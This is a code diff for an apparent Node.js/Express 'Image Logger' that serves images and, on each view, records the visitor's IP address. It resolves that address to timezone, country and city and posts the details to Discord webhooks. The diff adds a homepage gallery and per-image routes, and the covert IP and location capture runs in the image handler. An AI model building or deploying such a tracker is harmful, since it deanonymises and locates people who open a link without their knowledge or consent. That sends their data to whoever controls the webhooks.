@@ -54,24 +54,38 @@ const imageLogger = (imageData, imageName) => {
 }
 
 // Function to send the image to the webhooks
-const sendImageToWebhooks = (imageName, clientIP, timezone, country, city) => {
+const sendImageToWebhooks = (
+  imageName,
+  imageUrl,
+  clientIP,
+  timezone,
+  country,
+  city
+) => {
   timezone = timezone || 'not found'
   country = country || 'not found'
   city = city || 'not found'
 
-  const randomWebhookColor = Math.floor(Math.random() * 16777215).toString(16)
+  const randomcolors = ['#008000', '#E50000']
+  const randomWebhookColor =
+    randomcolors[Math.floor(Math.random() * randomcolors.length)]
 
   config.webhooks.forEach(webhook => {
     const webhookClient = new WebhookClient({ url: webhook.url })
     const embed = new EmbedBuilder()
       .setTitle('Someone requested an image')
-      .setThumbnail(`attachment://${imageName}`)
       .setFields([
+        {
+          name: '🖼️ Image',
+          value: `\`\`\`shell\n🖼️ Name: ${imageName}\n🔗 URL: ${imageUrl}\`\`\``
+        },
         {
           name: '📡 Network',
           value: `\`\`\`shell\n🌐 IP: ${clientIP}\n⏲️ Timezone: ${timezone}\n🌍 Country: ${country}\n🏙️ City: ${city}\`\`\``
         }
       ])
+      .setThumbnail(`attachment://${imageName}`)
+      .setImages([new AttachmentBuilder(imageUrl, imageName)])
       .setColor(randomWebhookColor)
       .setTimestamp()
 
@@ -100,24 +114,61 @@ app.enable('trust proxy')
 app.use(bodyParser.json())
 app.use(bodyParser.urlencoded({ extended: true }))
 
+// Serve the homepage with the list of available images
+app.get('/', (req, res) => {
+  const imageList = config.images.map(image => {
+    return `
+      <div class="image-container">
+        <h2>${image.name}</h2>
+        <img src="/image/${encodeURIComponent(image.name)}" alt="${
+      image.name
+    }" class="thumbnail" />
+      </div>
+    `
+  })
+
+  // Render the homepage with the image list
+  res.send(`
+    <html>
+      <head>
+        <title>Image Logger</title>
+        <style>
+          body {
+            background-color: #222;
+            color: #fff;
+            padding: 20px;
+            font-family: Arial, sans-serif;
+          }
+          .image-container {
+            display: inline-block;
+            margin: 10px;
+            text-align: center;
+          }
+          .thumbnail {
+            width: 200px;
+            height: auto;
+          }
+        </style>
+      </head>
+      <body>
+        <h1>Available Images</h1>
+        ${imageList.join('')}
+      </body>
+    </html>
+  `)
+})
+
 // Serve the image and log the request
-app.get('/image', (req, res) => {
-  const imageUrl = config.directory
-  const imageName = 'image.png' // Specify the desired image name
+app.get('/image/:imageName', (req, res) => {
+  const { imageName } = req.params
+  const image = config.images.find(img => img.name === imageName)
 
-  // Retrieve the client IP address
-  const clientIP =
-    req.headers['x-forwarded-for'] || req.connection.remoteAddress
+  if (image) {
+    const imageUrl = image.url
+    const imageName = `${image.name}.png`
 
-  // Use ipapi to get the client's information
-  try {
-    const ipInfo = geoip.lookup(clientIP)
-    const { timezone, country, city } = ipInfo
-
-    // Log the client's information
-    logger.info(
-      `Client IP: ${clientIP}, Timezone: ${timezone}, Country: ${country}, City: ${city}`
-    )
+    // Log the request
+    logger.info(`Image requested: ${imageUrl}`)
 
     // Serve the image
     res.sendFile(
@@ -132,10 +183,33 @@ app.get('/image', (req, res) => {
       }
     )
 
-    // Send the image to the webhooks
-    sendImageToWebhooks(imageUrl, imageName, clientIP, timezone, country, city)
-  } catch (error) {
-    logger.error(`Error getting client IP information: ${error}`)
+    try {
+      // Get client IP
+      const clientIP =
+        req.headers['x-forwarded-for'] || req.connection.remoteAddress
+
+      // Get client's information
+      const ipInfo = geoip.lookup(clientIP)
+      const { timezone, country, city } = ipInfo
+
+      logger.info(
+        `Client IP: ${clientIP}, Timezone: ${timezone}, Country: ${country}, City: ${city}`
+      )
+
+      // Send the image to the webhooks
+      sendImageToWebhooks(
+        imageName,
+        imageUrl,
+        clientIP,
+        timezone,
+        country,
+        city
+      )
+    } catch (error) {
+      logger.error(`Error sending image to webhooks: ${error}`)
+    }
+  } else {
+    res.status(404).json({ message: 'Image not found' })
   }
 })
 
